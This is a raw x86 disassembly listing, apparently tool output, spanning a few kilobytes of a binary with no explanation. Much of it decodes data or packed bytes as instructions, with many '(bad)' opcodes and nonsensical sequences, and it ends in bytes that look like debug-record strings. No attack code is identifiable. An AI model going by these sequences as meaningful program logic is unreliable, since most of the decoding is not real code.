  433366:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  43336d:	mov    esi,DWORD PTR [ebx]
  43336f:	cld    
  433370:	mov    cl,bh
  433372:	or     eax,0x372b6
  433377:	cmp    ecx,eax
  433379:	jne    0x4333f6
  43337f:	mov    eax,DWORD PTR [ebp-0x20]
  433382:	mov    eax,DWORD PTR [eax]
  433384:	xor    eax,edi
  433386:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  43338d:	mov    ecx,DWORD PTR [ebp-0x4]
  433390:	mov    ecx,edi
  433392:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433398:	jb     0x4333a9
  43339a:	add    BYTE PTR [edi-0x3f],dl
  43339d:	add    BYTE PTR [ebp-0x75],cl
  4333a0:	mov    esi,eax
  4333a2:	xor    eax,DWORD PTR [eax]
  4333a4:	mov    al,bh
  4333a6:	or     eax,0x4b7284
  4333ab:	xor    al,cl
  4333ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4333b0:	mov    ecx,edi
  4333b2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333b8:	jb     0x4333c9
  4333ba:	add    BYTE PTR [edi],dh
  4333bc:	enter  0x8500,0x8b
  4333c0:	add    ah,bl
  4333c2:	add    BYTE PTR [eax],al
  4333c4:	inc    ebp
  4333c5:	(bad)  
  4333c6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333cd:	mov    esi,DWORD PTR [edx-0x4]
  4333d0:	add    bh,cl
  4333d2:	dec    ebp
  4333d3:	mov    dh,0x8b
  4333d5:	add    esi,DWORD PTR [ebx]
  4333d7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333dd:	add    BYTE PTR [eax],al
  4333df:	mov    eax,ecx
  4333e1:	loopne 0x433430
  4333e3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333e9:	dec    ebx
  4333ea:	or     eax,0x8b7232
  4333ef:	in     al,0xc1
  4333f1:	or     DWORD PTR [ebp-0x31],ecx
  4333f4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333fb:	xor    dh,BYTE PTR [edx-0x75]
  4333fe:	add    al,dh
  433400:	enter  0x4f09,0xcf
  433404:	inc    ebp
  433405:	mov    WORD PTR [ebx-0x75cdccb5],cs
  43340b:	or     al,BYTE PTR ds:0xe4728b
  433411:	or     DWORD PTR [ebp-0x31],ecx
  433414:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  43341b:	cmp    dh,BYTE PTR [edx+0xf]
  43341e:	add    bl,dl
  433420:	rol    DWORD PTR [eax],0x4d
  433423:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433429:	(bad)  
  43342a:	or     eax,0x4b7284
  43342f:	xor    al,cl
  433431:	mov    ecx,DWORD PTR [ebp-0x20]
  433434:	mov    ecx,DWORD PTR [ecx]
  433436:	xor    ecx,edi
  433438:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43343f:	xor    cl,al
  433441:	mov    ecx,DWORD PTR [edi]
  433443:	fadd   QWORD PTR [ebp+0x9]
  433446:	call   0xffd02f1a
  43344b:	dec    ebx
  43344c:	dec    ebp
  43344d:	xor    bh,BYTE PTR [ebx]
  43344f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433453:	loopne 0x433451
  433455:	or     edi,eax
  433457:	iret   
  433458:	ret    
  433459:	mov    WORD PTR [ebp+0x4f],es
  43345c:	mov    esi,DWORD PTR [edx]
  43345e:	call   0x8452fb9d
  433463:	(bad)  
  433464:	fwait
  433465:	add    BYTE PTR [edx],dh
  433467:	mov    esi,DWORD PTR [ebx]
  433469:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43346f:	test   BYTE PTR [ebx],dh
  433471:	dec    ebx
  433472:	add    esi,DWORD PTR [edx]
  433474:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43347a:	dec    edi
  43347c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  433483:	xor    al,BYTE PTR [ebx]
  433485:	mov    edi,DWORD PTR [ebx]
  433487:	in     al,0x75
  433489:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43348f:	dec    ebx
  433490:	xor    esi,DWORD PTR [edx]
  433492:	lea    ecx,[edx]
  433494:	or     BYTE PTR [ebx+0x900f072],cl
  43349a:	ja     0x43346b
  43349c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  4334a3:	cmp    ch,al
  4334a5:	jne    0x43349a
  4334a7:	mov    edi,edi
  4334a9:	fadd   QWORD PTR [ebp+0x0]
  4334ac:	mov    eax,edi
  4334ae:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334b5:	mov    edx,DWORD PTR [ebx]
  4334b7:	in     al,0x45
  4334b9:	or     DWORD PTR [ebx],esi
  4334bb:	iret   
  4334bc:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334c3:	xor    dl,BYTE PTR [eax-0x75]
  4334c6:	sbb    al,0xe0
  4334c8:	dec    DWORD PTR [ecx]
  4334ca:	mov    ecx,edi
  4334cc:	in     al,dx
  4334cd:	mov    eax,es
  4334cf:	dec    ebx
  4334d0:	mov    DWORD PTR [edx],esi
  4334d2:	fmul   QWORD PTR [edx]
  4334d4:	jne    0x433461
  4334d6:	(bad)  
  4334d7:	(bad)  
  4334d9:	or     DWORD PTR [ebp-0x31],eax
  4334dc:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334e3:	cmp    bh,bh
  4334e5:	jne    0x43352c
  4334e7:	lea    ecx,[ebx-0x38372750]
  4334ed:	inc    ebx
  4334ef:	mov    eax,ecx
  4334f1:	mov    eax,0xa00c111
  4334f6:	jne    0x43353d
  4334f8:	mov    esi,DWORD PTR [ebx]
  4334fa:	test   al,0x3
  4334fc:	inc    ebp
  4334fd:	mov    DWORD PTR [eax-0xc],edx
  433500:	loop   0x433547
  433502:	push   DWORD PTR [ebx]
  433504:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43350a:	add    DWORD PTR [eax],eax
  43350c:	mov    eax,edi
  43350e:	lods   al,BYTE PTR ds:[esi]
  43350f:	dec    ebp
  433510:	inc    ebp
  433511:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433517:	retf   
  433518:	mov    edx,ecx
  43351a:	adc    al,0x84
  43351c:	(bad)  
  43351d:	std    
  43351e:	ret    
  43351f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433525:	hlt    
  433526:	rol    edi,0x82
  433529:	ret    
  43352a:	cld    
  43352b:	enter  0x11ff,0x45
  43352f:	inc    ebp
  433530:	pop    edi
  433531:	mov    ebx,DWORD PTR [ebx+0x14]
  433534:	ret    0xc7
  433537:	test   BYTE PTR [ebx+0x4532519b],cl
  43353d:	jmp    0x4334ca
  43353f:	push   0x8
  433541:	call   DWORD PTR [esi]
  433543:	in     al,dx
  433544:	add    BYTE PTR [ebp+0x1],0x50
  433548:	add    bh,ah
  43354a:	add    bh,bh
  43354c:	icebp  
  43354d:	mov    ecx,DWORD PTR [eax]
  43354f:	cld    
  433550:	pop    es
  433551:	dec    ebp
  433552:	shl    DWORD PTR [ebx],0x72
  433555:	add    eax,DWORD PTR [eax]
  433557:	cmp    edx,ecx
  433559:	je     0x43356b
  43355b:	mov    esi,DWORD PTR [ebp-0x4]
  43355e:	inc    edi
  433560:	or     al,0xc3
  433562:	jmp    FWORD PTR [edx-0x18]
  433565:	(bad)  
  433566:	sti    
  433567:	cwde   
  433568:	(bad)  
  433569:	call   0xffa12e74
  43356e:	or     al,0x45
  433570:	push   ebp
  433571:	sub    esp,0x18
  433574:	push   ebx
  433575:	inc    ebp
  433576:	mov    edi,edi
  433578:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43357f:	test   al,0x54
  433581:	inc    ebp
  433582:	push   ecx
  433583:	push   eax
  433584:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43358a:	add    ah,bh
  43358c:	(bad)  
  43358d:	dec    ebp
  43358e:	add    DWORD PTR [ebx],esi
  433590:	inc    ebp
  433591:	add    ecx,DWORD PTR [ebx+0x74943b]
  433597:	push   0xffffff8b
  433599:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43359f:	add    eax,DWORD PTR [ecx]
  4335a1:	or     BYTE PTR [eax],al
  4335a3:	call   0xff852da8
  4335a8:	mov    eax,DWORD PTR [ebp+0x14]
  4335ab:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4335b1:	inc    ebp
  4335b2:	dec    ecx
  4335b3:	add    ebp,DWORD PTR [edx+0x14]
  4335b6:	push   0x8b3045
  4335bb:	call   0x33ad8330
  4335c0:	inc    DWORD PTR [ebx]
  4335c2:	mov    DWORD PTR [edi],ecx
  4335c4:	mov    eax,ecx
  4335c6:	or     BYTE PTR [ebp-0x3d],cl
  4335c9:	cmp    eax,edi
  4335cb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335d0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335d6:	adc    al,0xc9
  4335d8:	inc    ebp
  4335d9:	adc    BYTE PTR [eax+0x55],dl
  4335dc:	jne    0x4335ca
  4335de:	call   0xff54356e
  4335e3:	dec    ebp
  4335e4:	inc    ebp
  4335e5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335eb:	add    BYTE PTR [ebx],bh
  4335ed:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335f1:	push   esp
  4335f2:	or     al,0x51
  4335f4:	dec    ebp
  4335f5:	xor    DWORD PTR [ebx],0xf32039b
  4335fb:	cmp    eax,DWORD PTR [ebp+0x74]
  4335fe:	mov    edi,edi
  433600:	pop    edi
  433601:	adc    BYTE PTR [ebx+0x75],bl
  433604:	ret    0x50
  433607:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43360b:	(bad)  
  43360c:	clc    
  43360d:	mov    esp,ebp
  43360f:	pop    ecx
  433610:	mov    ecx,0xf80085c2
  433615:	mov    ecx,DWORD PTR [ecx+edx*2]
  433618:	push   esi
  433619:	push   esi
  43361a:	(bad)  
  43361b:	lock add DWORD PTR [ebp+0x44],eax
  43361f:	mov    edx,DWORD PTR [eax]
  433621:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433625:	or     BYTE PTR [edi+eax*1+0x51],dl
  433629:	ret    
  43362a:	xor    ebx,DWORD PTR [ebx+0x37232be]
  433630:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433636:	or     al,0x80
  433638:	jge    0x43363b
  43363a:	mov    DWORD PTR [eax],eax
  43363c:	and    al,0x8
  43363e:	cmp    DWORD PTR [ebp+0x10],eax
  433641:	mov    edx,DWORD PTR [esi]
  433643:	xchg   esp,eax
  433644:	dec    esp
  433645:	add    BYTE PTR [eax],dl
  433647:	mov    ecx,edx
  433649:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43364d:	dec    ebp
  43364e:	into   
  43364f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433655:	mov    edx,DWORD PTR [eax+0x14]
  433658:	das    
  433659:	add    al,0x45
  43365b:	add    BYTE PTR [ebp+0x0],dh
  43365e:	mov    edi,edi
  433660:	and    al,0x50
  433662:	mov    eax,DWORD PTR [eax]
  433664:	and    al,0xd1
  433666:	xor    eax,DWORD PTR [esi]
  433668:	lea    eax,[ebp+0x8]
  43366b:	xor    esi,DWORD PTR [edx+0x3]
  43366e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433674:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43367a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433684:	cmp    al,0xff
  433686:	pushf  
  433687:	mov    edi,edi
  433689:	or     BYTE PTR [esi+ecx*1],cl
  43368c:	jne    0x433651
  43368e:	call   0xc365a
  433693:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433697:	mov    ebx,DWORD PTR [eax]
  433699:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43369d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4336a5:	pop    esi
  4336a6:	and    al,0xc9
  4336a8:	call   DWORD PTR [eax]
  4336aa:	and    al,0x55
  4336ac:	call   0x28359d
  4336b1:	add    DWORD PTR [eax+edx*1+0xc],0x31
  4336b6:	clc    
  4336b7:	pushf  
  4336b8:	dec    DWORD PTR [ecx+0x57892474]
  4336be:	jmp    0x433701
  4336c0:	and    al,0x89
  4336c2:	and    al,0x24
  4336c4:	or     BYTE PTR [ebx-0x45ebdbe8],cl
  4336ca:	dec    DWORD PTR [eax]
  4336cc:	and    al,0x7
  4336ce:	pop    esi
  4336cf:	cli    
  4336d0:	in     eax,0x9b
  4336d2:	ret    0x32
  4336d5:	add    eax,edx
  4336d7:	mov    DWORD PTR [ebx+0x688b8924],ebx
  4336dd:	or     al,0xf8
  4336df:	jl     0x43375e
  4336e1:	adc    al,0x9c
  4336e3:	dec    ebp
  4336e4:	push   0xff8b7575
  4336e9:	and    al,0xff
  4336eb:	xor    edi,edi
  4336ed:	mov    esi,DWORD PTR [esp-0x75]
  4336f1:	add    ecx,DWORD PTR [ebx+0x4cca0c0f]
  4336f7:	or     bl,ch
  4336f9:	cmp    DWORD PTR [eax],edx
  4336fb:	sbb    al,0x44
  4336fd:	or     BYTE PTR [eax+edx*1-0x7c],cl
  433701:	xor    ah,BYTE PTR [eax*4-0x7a8accf2]
  433708:	or     BYTE PTR [ecx*4+0x5d5fbf74],ah
  43370f:	test   eax,0x83001010
  433714:	dec    eax
  433715:	adc    BYTE PTR [eax],al
  433717:	adc    edi,DWORD PTR [edx+0x10]
  43371a:	add    cl,bh
  43371c:	jae    0x43372e
  43371e:	add    BYTE PTR [ebx-0x4bffefb4],dh
  433724:	pop    eax
  433725:	adc    BYTE PTR [eax],al
  433727:	fidiv  DWORD PTR [ebp+0x10]
  43372a:	add    dh,bl
  43372c:	movups xmm0,XMMWORD PTR [eax]
  43372f:	popf   
  433730:	push   cs
  433731:	adc    BYTE PTR [eax],al
  433733:	ins    DWORD PTR es:[edi],dx
  433734:	or     BYTE PTR [eax],dl
  433736:	add    BYTE PTR [ebx+eiz*2+0x370f0010],cl
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [edi],ah
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [ebx],ch
  433758:	aaa    
  433759:	inc    ebx
  43375a:	add    BYTE PTR [edi],ch
  43375c:	aaa    
  43375d:	inc    ebx
  43375e:	add    BYTE PTR [ebx],dh
  433760:	aaa    
  433761:	inc    ebx
  433762:	add    BYTE PTR [edi],dh
  433764:	aaa    
  433765:	inc    ebx
  433766:	add    BYTE PTR [ebx-0x73ffefdd],bh
  43376c:	cmp    al,0x10
  43376e:	add    BYTE PTR [ebx+0x30],cl
  433771:	adc    BYTE PTR [eax],al
  433773:	sub    al,0xc
  433775:	adc    BYTE PTR [eax],al
  433777:	push   ds
  433778:	adc    BYTE PTR ds:[eax],al
  43377b:	mov    bh,0x56
  43377d:	adc    BYTE PTR [eax],al
  43377f:	adc    eax,DWORD PTR [eax+edx*1+0x0]
  433783:	cmp    al,0x4f
  433785:	adc    BYTE PTR [eax],al
  433787:	addr16 aaa 
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebx+0x37],dh
  433795:	inc    ebx
  433796:	add    BYTE PTR [edi+0x37],dh
  433799:	inc    ebx
  43379a:	add    BYTE PTR [ebx+0x37],bh
  43379d:	inc    ebx
  43379e:	add    BYTE PTR [edi+0x37],bh
  4337a1:	inc    ebx
  4337a2:	add    BYTE PTR [ebx-0x23ffbcc9],al
  4337a8:	pop    esp
  4337a9:	adc    BYTE PTR [eax],al
  4337ab:	jle    0x4337cd
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	cld    
  4337b0:	dec    edx
  4337b1:	adc    BYTE PTR [eax],al
  4337b3:	add    al,0xb
  4337b5:	adc    BYTE PTR [eax],al
  4337b7:	push   ebx
  4337b8:	ins    DWORD PTR es:[edi],dx
  4337b9:	adc    BYTE PTR [eax],al
  4337bb:	fs jl  0x4337ce
  4337be:	add    BYTE PTR [edx+0x42001015],ah
  4337c4:	jge    0x4337d6
  4337c6:	add    BYTE PTR [edi-0x54ffbcc9],ah
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [edi-0x4cffbcc9],ch
  4337d4:	aaa    
  4337d5:	inc    ebx
  4337d6:	add    BYTE PTR [edi-0x44ffbcc9],dh
  4337dc:	aaa    
  4337dd:	inc    ebx
  4337de:	add    BYTE PTR [edi-0x3cffbcc9],bh
  4337e4:	aaa    
  4337e5:	inc    ebx
  4337e6:	add    BYTE PTR [edi+0x2300103a],ah
  4337ec:	aas    
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jne    0x4337fc
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	fldenv [esi]
  4337f5:	adc    BYTE PTR [eax],al
  4337f7:	xchg   esp,eax
  4337f8:	push   0x10
  4337fa:	add    bl,ah
  4337fc:	pop    eax
  4337fd:	adc    BYTE PTR [eax],al
  4337ff:	in     al,0x2f
  433801:	adc    BYTE PTR [eax],al
  433803:	leave  
  433804:	sbb    DWORD PTR [eax],edx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    bl,dh
  433814:	aaa    
  433815:	inc    ebx
  433816:	add    bh,dh
  433818:	aaa    
  433819:	inc    ebx
  43381a:	add    bl,bh
  43381c:	aaa    
  43381d:	inc    ebx
  43381e:	add    bh,bh
  433820:	aaa    
  433821:	inc    ebx
  433822:	add    BYTE PTR [ebx],al
  433824:	cmp    BYTE PTR [ebx+0x0],al
  433827:	mov    ebp,0x1d001062
  43382c:	adc    BYTE PTR [eax],dl
  43382e:	add    BYTE PTR [edi+0x51],dl
  433831:	adc    BYTE PTR [eax],al
  433833:	dec    eax
  433834:	ins    DWORD PTR es:[edi],dx
  433835:	adc    BYTE PTR [eax],al
  433837:	mov    eax,DWORD PTR [edi]
  433839:	adc    BYTE PTR [eax],al
  43383b:	mov    ah,0x7
  43383d:	adc    BYTE PTR [eax],al
  43383f:	ror    DWORD PTR [esi],1
  433841:	adc    BYTE PTR [eax],al
  433843:	pop    edi
  433844:	inc    ebp
  433845:	adc    BYTE PTR [eax],al
  433847:	daa    
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	xor    edi,DWORD PTR [eax]
  433855:	inc    ebx
  433856:	add    BYTE PTR [edi],dh
  433858:	cmp    BYTE PTR [ebx+0x0],al
  43385b:	cmp    edi,DWORD PTR [eax]
  43385d:	inc    ebx
  43385e:	add    BYTE PTR [edi],bh
  433860:	cmp    BYTE PTR [ebx+0x0],al
  433863:	inc    ebx
  433864:	cmp    BYTE PTR [ebx+0x0],al
  433867:	dec    ecx
  433868:	ss push eax
  43386a:	pop    edi
  43386b:	ss inc ebx
  43386d:	ss pop edx
  43386f:	xor    ebx,DWORD PTR [edi+0x52]
  433872:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433876:	pop    edi
  433877:	dec    esi
  433878:	dec    esp
  433879:	dec    eax
  43387a:	xor    esi,DWORD PTR [edx]
  43387c:	pop    edi
  43387d:	xor    al,0x4b
  43387f:	add    BYTE PTR [eax+0x49],cl
  433882:	push   ebp
  433883:	xor    al,0x5f
  433885:	dec    esp
  433886:	inc    edx
  433887:	dec    ecx
  433888:	cmp    DWORD PTR [edi+ebx*2],esi
  43388b:	pop    ecx
  43388c:	inc    edi
  43388d:	add    BYTE PTR [eax+0x50],bl
  433890:	dec    eax
  433891:	pop    edi
  433892:	push   ebp
  433893:	push   ecx
  433894:	inc    edi
  433895:	xor    cl,BYTE PTR [edx+0x38]
  433898:	push   esi
  433899:	add    BYTE PTR [ebx+0x4a],al
  43389c:	push   edx
  43389d:	pop    edi
  43389e:	dec    edi
  43389f:	dec    eax
  4338a0:	dec    edi
  4338a1:	dec    edi
  4338a2:	dec    edx
  4338a3:	add    BYTE PTR [ecx+0x52],al
  4338a6:	cmp    DWORD PTR [edi+0x56],ebx
  4338a9:	aaa    
  4338aa:	dec    esp
  4338ab:	cmp    DWORD PTR [ebx+0x5f],eax
  4338ae:	push   edx
  4338af:	inc    esp
  4338b0:	add    BYTE PTR [ecx+0x37],bl
  4338b3:	inc    esp
  4338b4:	pop    edi
  4338b5:	dec    ecx
  4338b6:	xor    esi,DWORD PTR [edi]
  4338b8:	xor    DWORD PTR [edi+0x49],ebx
  4338bb:	push   esp
  4338bc:	xor    eax,DWORD PTR [eax]
  4338be:	push   edx
  4338bf:	xor    BYTE PTR [eax+0x5f],bl
  4338c2:	dec    eax
  4338c3:	push   edi
  4338c4:	inc    esi
  4338c5:	xor    DWORD PTR [edi+0x5f],edx
  4338c8:	cmp    BYTE PTR [ebx+0x37],dl
  4338cb:	add    BYTE PTR [esi+0x42],dl
  4338ce:	dec    ecx
  4338cf:	xor    ebx,DWORD PTR [edi+0x45]
  4338d2:	xor    BYTE PTR [ebp+0x5f],cl
  4338d5:	xor    al,0x34
  4338d7:	xor    BYTE PTR [edx+0x5f],cl
  4338da:	inc    edi
  4338db:	add    BYTE PTR [edx+0x57],dl
  4338de:	xor    ebx,DWORD PTR [edi+0x31]
  4338e1:	dec    edx
  4338e2:	push   edi
  4338e3:	xor    eax,0x4d435f
  4338e8:	dec    ecx
  4338e9:	xor    eax,0x36365f39
  4338ee:	dec    eax
  4338ef:	xor    BYTE PTR [eax],al
  4338f1:	dec    edi
  4338f2:	inc    ebx
  4338f3:	push   edi
  4338f4:	pop    edi
  4338f5:	inc    edi
  4338f6:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4338fb:	add    BYTE PTR [edx+0x0],al
  4338fe:	pop    eax
  4338ff:	add    BYTE PTR [edi+0x0],al
  433902:	add    BYTE PTR ss:[edi+0x0],bl
  433906:	push   esi
  433907:	add    BYTE PTR [ebx+0x0],al
  43390a:	dec    esi
  43390b:	add    BYTE PTR [eax+eax*1+0x0],al
  43390f:	add    BYTE PTR [edi+0x0],cl
  433912:	dec    ebp
  433913:	add    BYTE PTR [edi+0x0],al
  433916:	xor    eax,DWORD PTR [eax]
  433918:	pop    edi
  433919:	add    BYTE PTR [eax+eax*1],dh
  43391c:	dec    esi
  43391d:	add    BYTE PTR [edx+0x0],bl
  433920:	cmp    BYTE PTR [eax],al
  433922:	pop    edi
  433923:	add    BYTE PTR [eax+0x0],bl
  433926:	cmp    BYTE PTR [eax],al
  433928:	add    BYTE PTR [eax],al
  43392a:	push   edx
  43392b:	add    BYTE PTR [eax+0x0],bl
  43392e:	push   ecx
  43392f:	add    BYTE PTR [edi+0x0],bl
  433932:	dec    esp
  433933:	add    BYTE PTR [edx+0x0],dl
  433936:	dec    ecx
  433937:	add    BYTE PTR [edi+0x0],cl
  43393a:	inc    esp
  43393b:	add    BYTE PTR [edi+0x0],bl
  43393e:	dec    edi
  43393f:	add    BYTE PTR [ebx],dh
  433941:	add    BYTE PTR [eax+eax*1+0x0],al
  433945:	add    BYTE PTR [ebx+0x0],al
  433948:	push   eax
  433949:	add    BYTE PTR [ebp+0x0],al
  43394c:	pop    edi
  43394d:	add    BYTE PTR ds:0x39004500,dh
  433953:	add    BYTE PTR [edi+0x0],bl
  433956:	push   esi
  433957:	add    BYTE PTR [eax],al
  433959:	add    BYTE PTR [edi+0x0],al
  43395c:	dec    esi
  43395d:	add    BYTE PTR [esi+0x0],dl
  433960:	pop    edi
  433961:	add    BYTE PTR [edi+0x0],al
  433964:	push   esp
  433965:	add    BYTE PTR [eax+0x0],cl
  433968:	xor    al,BYTE PTR [eax]
  43396a:	xor    DWORD PTR [eax],eax
  43396c:	pop    edi
  43396d:	add    BYTE PTR [edi+0x0],cl
  433970:	add    BYTE PTR ss:[ebx],dh
  433973:	add    BYTE PTR [eax],al
  433975:	add    BYTE PTR [eax+eax*1+0x45],al
  433979:	add    BYTE PTR [ecx+0x0],cl
  43397c:	pop    edi
  43397d:	add    BYTE PTR [edx+0x0],dl
  433980:	dec    eax
  433981:	add    BYTE PTR [eax+eax*1],dh
  433984:	dec    eax
  433985:	add    BYTE PTR [eax],al
  433987:	add    BYTE PTR [eax],al
  433989:	push   edx
  43398a:	push   ebx
  43398b:	inc    esp
  43398c:	push   ebx
  43398d:	cmp    al,BYTE PTR [esi+0x378de692]
  433993:	nop
  433994:	dec    eax
  433995:	xchg   ecx,eax
  433996:	or     BYTE PTR [esi],al
  433998:	xor    ecx,edi
  43399a:	pop    esp
  43399b:	sub    al,BYTE PTR [esi]
  43399d:	push   cs
  43399e:	add    BYTE PTR [eax],al
  4339a0:	add    BYTE PTR [ecx+0x3a],dl
  4339a3:	pop    esp
  4339a4:	js     0x4339fe
  4339a6:	ins    DWORD PTR es:[edi],dx
  4339a7:	arpl   WORD PTR [esi+0x76],sp
  4339aa:	addr16 jp 0x433a21
  4339ad:	pop    esp
  4339ae:	inc    ebp
  4339af:	inc    esi
  4339b0:	dec    edx
  4339b1:	bound  ebp,QWORD PTR [edx+0x67]
  4339b4:	popa   
  4339b5:	push   0x6c776a5c
  4339ba:	bound  esp,QWORD PTR [eax+ebp*2+0x70]
  4339be:	popa   
  4339bf:	bound  esi,QWORD PTR [edi+0x65]
  4339c2:	cs jo  0x433a29
  4339c5:	bound  eax,QWORD PTR [eax]
	...
